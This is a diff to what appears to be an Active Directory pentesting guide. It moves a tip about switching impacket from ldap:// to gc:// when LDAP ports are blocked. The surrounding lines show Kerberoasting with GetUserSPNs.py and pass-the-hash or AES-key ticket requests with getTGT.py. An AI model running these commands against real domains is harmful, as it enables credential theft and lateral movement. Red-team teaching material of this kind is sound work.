@@ -156,7 +156,8 @@ At the same time, you have the opportunity to unload service accounts with the a
 python GetUserSPNs.py -hashes :NTLM -request -target-domain jaki.local jaki.local/someuser
 ```
 
-if it is forbidden to use NTLM authorization in the domain, use Kerberos authorization:
+if ldap/ldaps ports are blocked but gc port 3268 is accessible - just fix ldap:// protocol to gc:// in impacket.
+If it is forbidden to use NTLM authorization in the domain, use Kerberos authorization:
 
 ```
 getTGT.py jaki.local/someuser -hashes :NTLM -dc-ip 10.10.1.1
@@ -201,7 +202,6 @@ getTGT.py scrm.local/ksimpson@scrm.local -aesKey 'yourkey'
 # and then Kerberos authentication
 ```
 
-If ldap/ldaps ports are blocked but gc port 3268 is accessible - just fix ldap:// protocol to gc:// in impacket.
 So we have several accounts, a lot of information from AD, how do we move on? First, you need to check those accounts in the Bloodhound database that you already have, carefully study their rights, groups, permissions. If you have cleartext passwords for SPN account - go back to them and try to go to the server specified in TGS using:
 
 ```
